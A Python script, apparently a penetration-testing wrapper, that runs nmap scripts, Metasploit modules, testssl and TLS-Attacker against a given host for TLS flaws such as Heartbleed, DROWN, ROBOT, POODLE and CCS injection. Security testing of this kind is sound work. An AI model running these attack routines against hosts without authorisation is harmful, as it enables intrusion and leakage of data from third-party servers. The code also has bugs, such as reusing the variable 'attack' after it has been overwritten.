import subprocess

def single_attack(attack,host):
    ip=host.split(':')[0]
    port=host.split(':')[1]
    path = "/home/kali/Desktop/TLS_Attack_Tools/TLS-Attacker/apps/Attacks.jar"
    try:
        if attack=='heartbleed':
        #NMAP Heartbleed
            heartbleed_script = "--script=ssl-heartbleed.nse"
            show_all = "--script-args=vulns.showall"
            command = f"nmap -A -p {port} --script=ssl-heartbleed.nse --script-args=vulns.showall {ip}"

            print('Start Heartbleed Attack with Nmap..\n')
            nmap = subprocess.Popen(['timeout', '120', 'nmap', '-A', '-p', port, heartbleed_script, show_all, ip],
                                        stdout=subprocess.PIPE)
            # nmap = subprocess.Popen([command], stdout=subprocess.PIPE)

            stdout = nmap.communicate()[0].decode()
            print(stdout)

            #Metasploit
            print('Start Heartbleed Attack with Metasploit..\n')
            tls_version='1.0'
            command = f"use auxiliary/scanner/ssl/openssl_heartbleed;set RHOST {ip};set RPORT {port};set TLS_VERSION {tls_version};check;exit"
            metasploit = subprocess.Popen(['msfconsole', '-x', command], stdout=subprocess.PIPE)
            stout = metasploit.communicate()[0].decode()
            print(stout)

            #TestSSL attack
            print('Start Heartbleed Attack with testssl..\n')
            attack = subprocess.Popen(
                    ['testssl', '--heartbleed', '--color', '0', '--parallel', '--ssl-native', '--fast', '--warnings', 'off',
                     host],
                    stdout=subprocess.PIPE)
            stdout = attack.communicate()[0].decode()
            print(stdout)

            #TLS Attacker
            print('Start Heartbleed Attack with TLS Attacker..')
            attack = subprocess.Popen(['timeout', '80', 'java', '-jar', path, 'heartbleed', '-connect', host],
                                              stdout=subprocess.PIPE)
            stdout = attack.communicate()[0].decode()
            print(stdout)

        if attack=='crime':
            print(f'Start test to verify if ${host} uses compression with testssl..')
            attack = subprocess.Popen(
                ['testssl', '--crime', '--color', '0', '--parallel', '--ssl-native', '--fast', '--warnings', 'off',
                 host],
                stdout=subprocess.PIPE)
            stdout = attack.communicate()[0].decode()
            print(stdout)
        if attack=='drown':
            print('Start DROWN attack with TLS Attacker..')
            attack = subprocess.Popen(['timeout', '80', 'java', '-jar', path, 'generalDrown', '-connect', host],
                                      stdout=subprocess.PIPE)
            stdout = attack.communicate()[0].decode()
            print(stdout)

            print('Start test for DROWN with testss..')
            attack = subprocess.Popen(
                ['testssl', '--drown', '--color', '0', '--parallel', '--ssl-native', '--fast', '--warnings', 'off',
                 host],
                stdout=subprocess.PIPE)
            stdout = attack.communicate()[0].decode()
            print(stdout)

        if attack=='bleichenbacher':
            print('Start BLEICHENBACHER attack with TLS Attacker..')
            attack = subprocess.Popen(['timeout', '80', 'java', '-jar', path, 'bleichenbacher', '-connect', host],
                                      stdout=subprocess.PIPE)
            stdout = attack.communicate()[0].decode()
            print(stdout)

        if attack=='robot':
            print('Test host for ROBOT attack with testssl..')
            attack = subprocess.Popen(
                ['testssl', '--robot', '--color', '0', '--parallel', '--ssl-native', '--fast', '--warnings', 'off',
                 host],
                stdout=subprocess.PIPE)
            stdout = attack.communicate()[0].decode()
            print(stdout)

            print('Start ROBOT attack with Metasploit..')
            command = f"use auxiliary/scanner/ssl/bleichenbacher_oracle;set RHOST {ip};set rport {port};exploit;exit"
            metasploit = subprocess.Popen(['msfconsole', '-x', command], stdout=subprocess.PIPE)
            stout = metasploit.communicate()[0].decode()
            print(stout)

        if attack=='padding_oracle_attack':
            print('Start Padding Oracle Attack with TLS Attacker..')
            attack = subprocess.Popen(['timeout', '80', 'java', '-jar', path, 'padding_oracle', '-connect', host],
                                      stdout=subprocess.PIPE)
            stdout = attack.communicate()[0].decode()
            print(stdout)

        if attack=='sweet32':
            print(f'Test host ${host} against Sweet32 attack with testssl..')
            attack = subprocess.Popen(
                ['testssl', '--sweet32', '--color', '0', '--parallel', '--ssl-native', '--fast', '--warnings', 'off',
                 host],
                stdout=subprocess.PIPE)
            stdout = attack.communicate()[0].decode()
            print(stdout)

        if attack=='logjam':
            print(f'Test host ${host} against Logjam attack with testssl..')
            attack = subprocess.Popen(
                ['testssl', '--logjam', '--color', '0', '--parallel', '--ssl-native', '--fast', '--warnings', 'off',
                 host],
                stdout=subprocess.PIPE)
            stdout = attack.communicate()[0].decode()
            print(stdout)

            print('Test host ${host} against Logjam attack with Nmap..')
            logJam_script = "--script=ssl-dh-params.nse"
            show_all = "--script-args=vulns.showall"
            logjam = subprocess.Popen(['nmap', '-A', '-p', port, logJam_script, show_all, ip],
                                          stdout=subprocess.PIPE)
            stdout = logjam.communicate()[0].decode()
            print(stdout)

        if attack=='lucky13':
            print(f'Test host ${host} against lucky13 with testssl..')
            attack = subprocess.Popen(
                ['testssl', '--lucky13', '--color', '0', '--parallel', '--ssl-native', '--fast', '--warnings', 'off',
                 host],
                stdout=subprocess.PIPE)
            stdout = attack.communicate()[0].decode()
            print(stdout)

        if attack=='poodle':
            print(f'Test host ${host} against POODLE with Nmap..')
            poodle_script = "--script=ssl-poodle"
            show_all = "--script-args=vulns.showall"
            poodle = subprocess.Popen(['nmap', '-A', '-p', port, poodle_script, show_all, ip],
                                          stdout=subprocess.PIPE)
            stdout = poodle.communicate()[0].decode()
            print(stdout)

            print(f'Test host ${host} against POODLE with testssl..')
            attack = subprocess.Popen(
                ['testssl', '--poodle', '--color', '0', '--parallel', '--ssl-native', '--fast', '--warnings', 'off',
                 host],
                stdout=subprocess.PIPE)
            stdout = attack.communicate()[0].decode()
            print(stdout)

            print(f'Test host ${host} against POODLE with TLS Attacker..')
            attack = subprocess.Popen(['timeout', '80', 'java', '-jar', path, 'poodle', '-connect', host],
                                      stdout=subprocess.PIPE)
            stdout = attack.communicate()[0].decode()
            print(stdout)

        if attack=='ticketbleed':
            print(f'Test host ${host} against Ticketbleed with Nmap..')
            ticketBleed_script = "--script=tls-ticketbleed"
            show_all = "--script-args=vulns.showall"
            poodle = subprocess.Popen(['nmap', '-A', '-p', port, ticketBleed_script, show_all, ip],
                                          stdout=subprocess.PIPE)
            stdout = poodle.communicate()[0].decode()
            print(stdout)

        if attack=='ccs_injection':
            print(f'Test host ${host} against CCSInjection with Nmap..')
            CCSInjection_script = "--script=ssl-ccs-injection"
            show_all = "--script-args=vulns.showall"

            poodle = subprocess.Popen(['nmap', '-A', '-p', port, CCSInjection_script, show_all, ip],
                                          stdout=subprocess.PIPE)

            stdout = poodle.communicate()[0].decode()
            print(stdout)

            print(f'Test host ${host} against CCSInjection with Metasploit..')
            command = f"use auxiliary/scanner/ssl/openssl_ccs;set RHOST {ip};set RPORT {port};exploit;exit"
            metasploit = subprocess.Popen(['msfconsole', '-x', command], stdout=subprocess.PIPE)
            stout = metasploit.communicate()[0].decode()
            print(stout)

        if attack=='roca':
            print(f'Test host ${host} against ROCA with Nmap..')
            roca_script = "--script=rsa-vuln-roca"
            show_all = "--script-args=vulns.showall"
            poodle = subprocess.Popen(['nmap', '-A', '-p', port, roca_script, show_all, ip],
                                          stdout=subprocess.PIPE)
            stdout = poodle.communicate()[0].decode()
            print(stdout)



    except:
        print('Attack does not work\n')